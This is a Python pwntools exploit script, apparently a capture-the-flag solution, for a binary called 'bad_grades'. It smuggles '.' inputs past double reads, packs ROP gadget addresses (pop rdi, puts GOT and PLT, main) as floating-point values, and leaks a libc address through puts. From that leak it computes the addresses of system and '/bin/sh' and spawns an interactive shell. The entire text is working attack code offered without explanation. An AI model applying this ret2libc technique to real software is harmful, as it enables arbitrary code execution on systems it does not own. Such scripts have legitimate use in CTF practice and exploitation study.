from pwn import *
import struct
import time
import binascii

def double_pointer(pointer_value):
    # Convert the pointer value to a byte string (64-bit)
    byte_string = struct.pack('Q', pointer_value)  # 'Q' for unsigned long long (8 bytes)
    
    # Convert the byte string to a hexadecimal string
    hex_byte_string = binascii.hexlify(byte_string)
    
    # Convert the hexadecimal string back to bytes
    byte_data = binascii.unhexlify(hex_byte_string)
    
    # Unpack the bytes as a double
    x = struct.unpack('d', byte_data)
    
    return x[0]


p = process('./bad_grades')

gdb.attach(p, gdbscript = 'set disassembly-flavor intel\nb*0x4010e7\nc\n')
p.recv()
p.sendline('2')
p.sendline(str(39))

for i in range(33):
	p.sendline('1')
p.recv()
p.sendline('.')

# gadgets
pop_rdi = 0x0000000000401263
puts_got = 0x601fa8
puts_plt = 0x400680
main = 0x00401108
ret = 0x401107

#p.sendline(str(2.0744145*(10**-317)))
p.sendline('.')
#p.sendline(str(double_pointer(ret)))
p.sendline(str(double_pointer(pop_rdi)))
p.sendline(str(double_pointer(puts_got)))
p.recv()
p.sendline(str(double_pointer(puts_plt)))
p.sendline(str(double_pointer(main)))

p.recvline()
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info('leak: %s'%hex(leak))

system = leak - 0x32190
binsh = leak + 0x13019d

info('system: %s'%hex(system))
info('binsh: %s'%hex(binsh))

#p.recv()
p.sendline('2')
p.sendline(str(38))

for i in range(33):
	p.sendline('1')
p.recv()
p.sendline('.')
p.sendline('.')
#p.sendline(str(double_pointer(ret)))
p.sendline("{}".format(double_pointer(pop_rdi)))
p.recv()
print(double_pointer(binsh))


p.sendline("{}".format(double_pointer(binsh) + 0.63 * (10**(-314-9))))
p.sendline("{}".format(double_pointer(system) + 0.00000000063 * (10**-314)))


p.interactive()
